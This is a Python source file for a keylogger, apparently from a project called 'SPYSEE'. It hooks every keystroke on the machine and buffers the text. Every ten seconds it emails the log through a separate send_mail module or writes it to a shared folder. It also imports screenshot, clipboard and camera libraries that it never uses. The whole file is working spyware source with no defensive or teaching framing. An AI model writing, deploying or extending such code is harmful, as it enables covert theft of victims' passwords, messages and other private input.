import os
import cv2
import send_mail  # Import send_mail.py
import pyperclip
from PIL import ImageGrab
import keyboard
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 10  # (in seconds)
SHARED_FOLDER = r"C:\Users\UTB\source\repos\SPYSEE"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_date = datetime.now()
        self.end_date = datetime.now()
        self.last_char = None

    def report(self):
        if self.log:
            self.end_date = datetime.now()
            self.create_filename()
            if self.report_method == "email":
                send_mail.send_email()  # Use send_email from send_mail.py
            elif self.report_method == "file":
                self.save_to_file()
            self.start_date = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def create_filename(self):
        start_date_str = str(self.start_date)[:7].replace(" ", "_").replace(":", "")
        end_date_str = str(self.end_date)[:-7].replace(" ", "_").replace(":", "")
        self.filename = f'keylog-{start_date_str}_{end_date_str}'

    def save_to_file(self):
        log_file_path = os.path.join(SHARED_FOLDER, "keylog.txt") 
        with open(log_file_path, "a") as f:
            f.write(self.log)

    def start(self):
        self.start_date = datetime.now()
        keyboard.hook(callback=self.key_press)
        self.report()
        keyboard.wait('esc') 

    def key_press(self, event):
        name = event.name
        if event.event_type == 'down':
            if name == self.last_char:
                return
            self.last_char = name
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "tab":
                    name = "[TAB]"
                elif name == "ctrl":
                    name = "[CTRL]"
                else:
                    name = f"[{name.upper()}]"
            self.log += name
        elif event.event_type == 'up':
            self.last_char = None

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()
